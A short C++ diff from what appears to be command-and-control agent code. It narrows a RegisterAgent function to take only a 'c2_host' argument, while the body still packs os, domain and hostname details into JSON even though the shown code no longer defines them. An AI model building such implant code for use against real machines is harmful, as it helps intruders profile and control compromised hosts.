@@ -2,8 +2,7 @@
 
 
 namespace communication {
-    nlohmann::json RegisterAgent(const std::wstring& c2_host, const std::wstring& os,
-        const std::wstring& domain, const std::wstring& hostname) {
+    nlohmann::json RegisterAgent(const std::wstring& c2_host) {
         nlohmann::json j;
         j["os"] = os;
         j["domain"] = domain;
